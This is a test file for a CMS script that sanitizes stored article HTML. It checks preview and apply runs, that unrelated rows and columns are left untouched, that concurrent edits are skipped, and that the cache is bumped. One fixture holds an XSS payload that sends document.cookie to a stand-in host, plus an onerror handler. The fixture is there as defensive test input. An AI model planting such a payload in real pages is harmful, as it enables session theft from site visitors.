import assert from 'node:assert/strict'
import test, { beforeEach, mock } from 'node:test'

/**
 * `npm run db:sanitize-html` on `articles.content` (CHANGELOG § 103), run for real: Drizzle's own MySQL statements on
 * SQLite (`_sqlite-mysql-db.ts`). What the operator relies on before and after `--apply`:
 *
 *   - the default run only COUNTS (nothing written, no cache bump);
 *   - `--apply` rewrites the rows whose body the sanitizer changes, and ONLY those: a clean body, a body that differs
 *     by `alt=""` → `alt` alone, a NULL and an empty body keep their exact bytes;
 *   - only `content` and `updated_at` are written (`updated_at = updated_at`: `ON UPDATE CURRENT_TIMESTAMP` must not
 *     stamp hundreds of articles as edited today), never the view totals;
 *   - an officer's edit between the read and the write is kept (`skipped`), by the bytes the fix was planned from;
 *   - the chatbot answer cache is bumped once after a run that wrote, and not otherwise;
 *   - a second run changes nothing.
 */

const { createSqliteMysqlDb } = await import('./_sqlite-mysql-db')
const { articles, articleTranslations, pageBlocks } = await import('../server/db/schema')
// The run also walks the translation and block tables; they stay empty here.
const harness = createSqliteMysqlDb([articles, articleTranslations, pageBlocks])
let bumps = 0
mock.module('../server/utils/db', { namedExports: { getDb: () => harness.db, getPool: () => null } })
mock.module('../server/services/chatbot-answer-cache', { namedExports: { bumpAnswerCacheVersion: async () => { bumps += 1; return bumps } } })
const { runStoredHtmlSanitize } = await import('../server/services/stored-html-sanitize')

const HOSTILE = '<p>Mở đầu</p><script>fetch("//evil.test/?c="+document.cookie)</script><img src=x onerror="alert(1)"><p>Kết</p>'
const CLEAN = '<h2>Tập huấn</h2><p style="text-align: center;">Cục <strong>C11</strong>.</p>'
const ALT_ONLY = '<p><img alt="" src="/uploads/a.jpg"></p>'
const EDITED = '<p>Cán bộ vừa sửa bài này</p>'

const EARLIER = new Date('2025-01-18T04:15:47Z')
function seed(id: number, content: string | null) {
  harness.sqlite.exec(`INSERT INTO articles (id, type, title, slug, content, status, updated_at, view_total_real, view_total_fabricated, view_total)
    VALUES (${id}, 'news', 'T${id}', 's${id}', ${content === null ? 'NULL' : `'${content.replace(/'/g, "''")}'`}, 'published', '${EARLIER.toISOString().slice(0, 19).replace('T', ' ')}', 5, 3, 8)`)
}
const row = (id: number) => harness.sqlite.prepare('SELECT content, updated_at AS updatedAt, view_total_real AS real, view_total_fabricated AS fab, view_total AS total FROM articles WHERE id = ?').get(id) as { content: string | null, updatedAt: string, real: number, fab: number, total: number }
const counts = (r: { articles: { scanned: number, changed: number, written: number, skipped: number } }) => ({ scanned: r.articles.scanned, changed: r.articles.changed, written: r.articles.written, skipped: r.articles.skipped })
const updates = () => harness.statements.filter(sql => /^update `articles`/i.test(sql))

beforeEach(() => {
  harness.reset()
  bumps = 0
  seed(1, HOSTILE)
  seed(2, CLEAN)
  seed(3, ALT_ONLY)
  seed(4, null)
  seed(5, '')
})

test('the default run is a preview: counts the row that would change, writes nothing, bumps nothing', async () => {
  const before = [1, 2, 3, 4, 5].map(row)
  const report = await runStoredHtmlSanitize()
  assert.equal(report.applied, false)
  assert.deepEqual(counts(report), { scanned: 5, changed: 1, written: 0, skipped: 0 })
  assert.deepEqual([1, 2, 3, 4, 5].map(row), before)
  assert.equal(updates().length, 0)
  assert.equal(bumps, 0)
})

test('--apply cleans only the hostile body, keeps every other row byte for byte, and leaves updated_at and the view totals alone', async () => {
  const report = await runStoredHtmlSanitize({ apply: true })
  assert.deepEqual(counts(report), { scanned: 5, changed: 1, written: 1, skipped: 0 })
  const cleaned = row(1)
  assert.doesNotMatch(cleaned.content!, /<script|onerror/i)
  assert.match(cleaned.content!, /Mở đầu/)
  assert.match(cleaned.content!, /Kết/)
  assert.equal(row(2).content, CLEAN)
  assert.equal(row(3).content, ALT_ONLY, 'alt="" → alt alone is not worth a rewrite')
  assert.equal(row(4).content, null)
  assert.equal(row(5).content, '')
  for (const id of [1, 2, 3, 4, 5]) {
    const stored = row(id)
    assert.equal(stored.updatedAt, '2025-01-18 04:15:47', `article ${id}: updated_at moved`)
    assert.deepEqual([stored.real, stored.fab, stored.total], [5, 3, 8], `article ${id}: view totals changed`)
  }
  // One statement, one row, writing exactly the body and the pinned updated_at — no other column.
  const [update, ...rest] = updates()
  assert.equal(rest.length, 0)
  assert.match(update!, /^update `articles` set `content` = \?, `updated_at` = `articles`\.`updated_at` where /i)
  assert.doesNotMatch(update!.split(' where ')[0]!, /view_total|title|slug|status|published_at/i)
  assert.equal(bumps, 1, 'chatbot answer cache bumped once after the write')
})

test('a second --apply finds nothing to change and does not bump again', async () => {
  await runStoredHtmlSanitize({ apply: true })
  bumps = 0
  harness.statements.length = 0
  const again = await runStoredHtmlSanitize({ apply: true })
  assert.deepEqual(counts(again), { scanned: 5, changed: 0, written: 0, skipped: 0 })
  assert.equal(updates().length, 0)
  assert.equal(bumps, 0)
})

test('an officer who saves the article between the read and the write keeps their edit (skipped), and nothing is bumped', async () => {
  harness.beforeNext(/^update `articles`/i, () => {
    harness.sqlite.prepare('UPDATE articles SET content = ? WHERE id = 1').run(EDITED)
  })
  const report = await runStoredHtmlSanitize({ apply: true })
  assert.deepEqual(counts(report), { scanned: 5, changed: 1, written: 0, skipped: 1 })
  assert.equal(row(1).content, EDITED)
  assert.equal(bumps, 0, 'nothing was written, so the cache is not touched')
})

// Words the reader sees: a bare `<` in running text makes the sanitizer drop what follows it, so the preview must name the
// row (the rows whose only change is markup — the hostile one here — are not counted).
const BARE_LT = '<p>x < y and more</p><p>tail</p>'

test('the preview names the rows whose visible words change, and only those', async () => {
  seed(6, BARE_LT)
  const report = await runStoredHtmlSanitize()
  assert.equal(report.articles.changed, 2, 'the hostile row and the bare-< row')
  assert.equal(report.articles.textChanged, 1)
  assert.deepEqual(report.articles.textChangedIds, [6])
  assert.equal(row(6).content, BARE_LT, 'a preview writes nothing')
})

test('the chatbot answer cache is bumped even when a later statement throws, once rows were written', async () => {
  seed(6, HOSTILE)
  // The first UPDATE succeeds; the one after it throws.
  harness.beforeNext(/^update `articles`/i, () => harness.beforeNext(/^update `articles`/i, () => harness.failNext(/^update `articles`/i)))
  await assert.rejects(runStoredHtmlSanitize({ apply: true }))
  assert.equal(bumps, 1)
  assert.doesNotMatch(row(1).content!, /<script/, 'the first row was written before the failure')
  assert.match(row(6).content!, /<script/, 'the second was not')
})

test('rows are walked in id batches: a table larger than one batch is cleaned completely', async () => {
  for (let id = 100; id < 100 + 450; id++) seed(id, HOSTILE)
  const report = await runStoredHtmlSanitize({ apply: true })
  assert.equal(report.articles.scanned, 455)
  assert.deepEqual([report.articles.changed, report.articles.written, report.articles.skipped], [451, 451, 0])
  const left = harness.sqlite.prepare("SELECT COUNT(*) AS n FROM articles WHERE content LIKE '%<script%'").get() as { n: number }
  assert.equal(left.n, 0)
})
